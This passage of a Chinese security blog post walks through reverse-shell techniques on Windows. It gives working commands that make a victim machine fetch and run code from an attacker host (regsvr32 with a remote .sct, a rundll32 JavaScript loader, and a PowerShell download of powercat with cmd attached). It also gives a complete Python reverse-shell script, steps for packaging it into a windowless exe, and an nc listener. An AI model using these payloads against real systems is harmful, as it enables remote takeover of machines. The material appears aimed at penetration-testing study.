+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">regsvr32 /s /n /u /i:http://192.168.111.128:6666/nGauv3ccOg8WF.sct scrobj.dll<br></code></pre></td></tr></table></figure>
+<p>测试执行成功，msf有回显，但是没拿到sessions？</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160415706.png" srcset="/img/loading.gif" lazyload alt="image-20210924160415706" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160445451.png" srcset="/img/loading.gif" lazyload alt="image-20210924160445451" style="zoom:80%;">
+<h3 id="22-rundll32命令反弹shell"><a class="markdownIt-Anchor" href="#22-rundll32命令反弹shell"></a> 2.2 rundll32命令反弹shell</h3>
+<p>使用MyJSRat<br>
+<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRidter%2FMyJSRat">https://github.com/Ridter/MyJSRat</a></p>
+<p>攻击机运行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python MyJSRat.py -i  攻击机ip -p 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机运行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rundll32.exe javascript:<span class="hljs-string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write();h=new%20ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.Open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://攻击机ip:攻击机端口/connect&quot;</span>,<span class="hljs-literal">false</span>);try&#123;h.Send();b=h.ResponseText;<span class="hljs-built_in">eval</span>(b);&#125;catch(e)&#123;new%20ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="hljs-literal">true</span>);&#125;<br></code></pre></td></tr></table></figure>
+<p>效果：</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924161907221.png" srcset="/img/loading.gif" lazyload alt="image-20210924161907221" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924161840713.png" srcset="/img/loading.gif" lazyload alt="image-20210924161840713" style="zoom:80%;">
+<h3 id="23-python反弹shell"><a class="markdownIt-Anchor" href="#23-python反弹shell"></a> 2.3 python反弹shell</h3>
+<p>python脚本代码（靶机运行）参考<a target="_blank" rel="noopener" href="https://choge.top/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/">反弹shell脚本收集 | C0cho’s blog (choge.top)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ReserveConnect</span>(<span class="hljs-params">addr, port</span>):</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;shell&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        shell.connect((addr,port))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> reason:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;[-] Failed to Create Socket : %s&#x27;</span>%reason)<br>        exit(<span class="hljs-number">0</span>)<br>    rlist = [shell]<br>    wlist = []<br>    elist = [shell]<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        shell.send(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>        rs,ws,es = select.select(rlist,wlist,wlist)<br>        <span class="hljs-keyword">for</span> sockfd <span class="hljs-keyword">in</span> rs:<br>            <span class="hljs-keyword">if</span> sockfd == shell:<br>                command = shell.recv(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> command == <span class="hljs-string">&#x27;exit&#x27;</span>:<br>                    shell.close()<br>                    <span class="hljs-keyword">break</span><br>                result, error = subprocess.Popen(command,shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()<br>                shell.sendall(result.decode(<span class="hljs-string">&quot;GB2312&quot;</span>).encode(<span class="hljs-string">&quot;UTF-8&quot;</span>))<br><br><span class="hljs-comment"># 主函数运行</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage: python reverse.py [IP] [PORT]&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        url = sys.argv[<span class="hljs-number">1</span>]<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>        ReserveConnect(url,port)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run()<br></code></pre></td></tr></table></figure>
+<p><strong>靶机运行</strong></p>
+<p><strong>1.若没有python，可以封装成exe在靶机上运行</strong></p>
+<p>封装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pythinstaller -Fw  脚本名.py<br></code></pre></td></tr></table></figure>
+<p>使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxx.exe 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure>
+<p><strong>2.python直接运行</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python 脚本名.py 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure>
+<p><strong>攻击机运行nc即可</strong></p>
+<p>攻击机命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>效果：</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924163150141.png" srcset="/img/loading.gif" lazyload alt="image-20210924163150141" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924163220775.png" srcset="/img/loading.gif" lazyload alt="image-20210924163220775" style="zoom:80%;">
+<h3 id="24-powershell反弹powershell使用powercat"><a class="markdownIt-Anchor" href="#24-powershell反弹powershell使用powercat"></a> 2.4 powershell反弹powershell（使用powercat）</h3>
+<p>powercat github地址：<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">besimorhino/powercat: netshell features all in version 2 powershell (github.com)</a></p>
+<p>需要执行：Set-ExecutionPolicy RemoteSigned</p>
+<p>设置包含可执行脚本</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924165941195.png" srcset="/img/loading.gif" lazyload alt="image-20210924165941195" style="zoom:80%;">
+<p>靶机运行命令</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>&#x27;)</span>; powercat -c 攻击机ip -p 攻击机端口 -e cmd<br></code></pre></td></tr></table></figure>
+<p>攻击机nc监听即可</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！，本博客仅用于交流学习，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。
+文章作者拥有对此站文章的修改和解释权。如欲转载此站文章，需取得作者同意，且必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。若造成严重后果，本人将依法追究法律责任。 阅读本站文章则默认遵守此规则。
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">python分割补全ip小脚本(用于goby)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/">
+                        <span class="hidden-mobile">记一次实战渗透sql时间注入payload利用(select(0)from(select(sleep(6)))v)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        琼ICP备2021006694号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
